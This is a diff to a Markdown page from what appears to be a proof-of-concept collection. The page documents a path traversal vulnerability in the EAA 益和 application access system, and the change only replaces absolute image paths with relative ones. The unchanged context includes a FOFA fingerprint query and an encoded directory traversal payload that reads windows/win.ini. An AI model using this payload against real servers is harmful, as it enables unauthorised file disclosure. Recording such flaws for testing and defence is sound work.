@@ -18,7 +18,7 @@ body="EAA益和应用接入系统"
 
 登陆页面
 
-![image-20230704111747376](D:\TMP_FILE\awesome-poc\webapp\images\image-20230704111747376.png) 
+![image-20230704111747376](./images/image-20230704111747376.png) 
 
 验证POC
 
@@ -26,4 +26,4 @@ body="EAA益和应用接入系统"
 /..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/windows/win.ini
 ```
 
-![image-20230704112349037](D:\TMP_FILE\awesome-poc\webapp\images\image-20230704112349037.png)
+![image-20230704112349037](./images/image-20230704112349037.png)
